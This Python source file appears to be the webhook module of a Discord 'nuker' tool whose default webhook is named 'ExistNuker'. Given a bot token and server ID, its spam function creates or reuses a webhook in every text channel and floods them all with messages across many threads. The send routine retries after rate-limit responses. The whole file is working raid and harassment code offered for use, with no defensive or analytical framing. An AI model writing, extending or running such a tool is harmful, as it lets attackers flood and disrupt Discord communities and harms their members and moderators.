"""
Webhook Operations Module
Handles Discord webhook operations
Creates webhooks and starts spamming immediately (parallel)
Supports custom name and avatar with validation
Cross-platform with connection pooling
"""

import threading
import time
import queue
from discord_api import make_request, get_session
from config import Colors, THREADS, stop_event
import channels

# Default webhook settings
DEFAULT_WEBHOOK_NAME = "ExistNuker"
DEFAULT_WEBHOOK_AVATAR = "https://i.pinimg.com/originals/a5/4b/a2/a54ba238b3d4843e0dcd3294d168fbca.gif"


def validate_image_url(url):
    """
    Validate if URL is a valid image/gif
    Returns True if valid, False otherwise
    """
    if not url or not url.startswith(('http://', 'https://')):
        return False
    
    session = get_session()
    try:
        # Make HEAD request to check content type
        response = session.head(url, timeout=5, allow_redirects=True)
        content_type = response.headers.get('Content-Type', '').lower()
        
        # Check if it's an image
        if any(img_type in content_type for img_type in ['image/', 'gif']):
            return True
        
        # Some URLs don't return proper content-type, try GET with range
        response = session.get(url, timeout=5, stream=True, headers={'Range': 'bytes=0-100'})
        content_type = response.headers.get('Content-Type', '').lower()
        
        if any(img_type in content_type for img_type in ['image/', 'gif']):
            return True
        
        # Check common image extensions
        if any(url.lower().endswith(ext) for ext in ['.png', '.jpg', '.jpeg', '.gif', '.webp']):
            return response.status_code in [200, 206]
        
        return False
    except Exception:
        return False


def get_channel_webhooks(token, channel_id):
    """Get webhooks for a specific channel"""
    success, data = make_request("GET", f"/channels/{channel_id}/webhooks", token)
    if success and isinstance(data, list):
        return data
    return []


def create(token, channel_id, name):
    """Create a webhook in a channel"""
    payload = {"name": name}
    success, data = make_request("POST", f"/channels/{channel_id}/webhooks", token, payload)
    return success, data


def send(webhook_url, content, username, avatar_url):
    """Send a message via webhook"""
    session = get_session()
    payload = {
        "content": content,
        "username": username,
        "avatar_url": avatar_url
    }
    
    try:
        response = session.post(webhook_url, json=payload, timeout=5)
        if response.status_code == 429:
            try:
                data = response.json()
                retry_after = data.get("retry_after", 1)
                if stop_event.wait(retry_after):
                    return False
                response = session.post(webhook_url, json=payload, timeout=5)
            except Exception:
                pass
        return response.status_code in [200, 204]
    except Exception:
        return False


def get_or_create_webhook(token, channel_id, channel_name, webhook_name):
    """Get existing webhook or create new one"""
    existing = get_channel_webhooks(token, channel_id)
    for wh in existing:
        if wh.get('name') == webhook_name:
            wh_id = wh.get('id')
            wh_token = wh.get('token')
            if wh_id and wh_token:
                return f"https://discord.com/api/webhooks/{wh_id}/{wh_token}"
    
    success, data = create(token, channel_id, webhook_name)
    if success and data:
        wh_id = data.get('id')
        wh_token = data.get('token')
        if wh_id and wh_token:
            return f"https://discord.com/api/webhooks/{wh_id}/{wh_token}"
    
    return None


def spam(token, guild_id, content, amount_per_channel, webhook_name=None, avatar_url=None, thread_count=THREADS, stop_event=None):
    """
    Spam messages - starts spamming immediately as webhooks are created
    
    Args:
        token: Bot token
        guild_id: Guild ID
        content: Message content
        amount_per_channel: Messages per channel
        webhook_name: Custom webhook name (optional)
        avatar_url: Custom avatar URL (optional, validated)
        thread_count: Number of threads
        stop_event: Stop event for Ctrl+C
    """
    # Use defaults if not provided
    name = webhook_name if webhook_name else DEFAULT_WEBHOOK_NAME
    avatar = avatar_url if avatar_url else DEFAULT_WEBHOOK_AVATAR
    
    print(f"{Colors.CYAN}Fetching channels...{Colors.RESET}")
    all_channels = channels.get_all(token, guild_id)
    
    target_channels = [c for c in all_channels if c.get('type', 0) in [0, 2, 5, 13]]
    
    if not target_channels:
        print(f"{Colors.YELLOW}No channels found{Colors.RESET}")
        return 0
    
    print(f"{Colors.CYAN}Found {len(target_channels)} channels{Colors.RESET}")
    print(f"{Colors.CYAN}Webhook Name: {name}{Colors.RESET}")
    print(f"{Colors.CYAN}Avatar: {avatar[:50]}...{Colors.RESET}")
    print(f"{Colors.GREEN}Creating webhooks & spamming simultaneously...{Colors.RESET}\n")
    
    webhook_queue = queue.Queue()
    sent = [0]
    created = [0]
    done_creating = [False]
    lock = threading.Lock()
    
    def spam_worker():
        while True:
            if stop_event and stop_event.is_set():
                return
            
            try:
                wh = webhook_queue.get(timeout=0.5)
            except queue.Empty:
                if done_creating[0] and webhook_queue.empty():
                    return
                continue
            
            for _ in range(amount_per_channel):
                if stop_event and stop_event.is_set():
                    return
                
                if send(wh['url'], content, name, avatar):
                    with lock:
                        sent[0] += 1
                    if sent[0] % 20 == 0:
                        print(f"{Colors.GREEN}Sent {sent[0]} messages...{Colors.RESET}")
                
                if stop_event.wait(0.03):
                    return
            
            webhook_queue.task_done()
    
    def create_worker():
        for channel in target_channels:
            if stop_event and stop_event.is_set():
                break
            
            channel_id = channel.get('id')
            channel_name = channel.get('name', 'unknown')
            
            webhook_url = get_or_create_webhook(token, channel_id, channel_name, name)
            if webhook_url:
                with lock:
                    created[0] += 1
                print(f"{Colors.CYAN}[{created[0]}/{len(target_channels)}] Ready: #{channel_name}{Colors.RESET}")
                
                webhook_queue.put({
                    'url': webhook_url,
                    'channel_name': channel_name
                })
            else:
                print(f"{Colors.RED}Failed: #{channel_name}{Colors.RESET}")
            
            if stop_event.wait(0.05):
                break
        
        done_creating[0] = True
    
    producer = threading.Thread(target=create_worker)
    producer.start()
    
    spam_threads = min(thread_count, 20)
    consumers = []
    for _ in range(spam_threads):
        t = threading.Thread(target=spam_worker)
        t.start()
        consumers.append(t)
    
    producer.join()
    
    for t in consumers:
        t.join()
    
    print(f"\n{Colors.GREEN}Finished! Created {created[0]} webhooks, Sent {sent[0]} messages{Colors.RESET}")
    return sent[0]
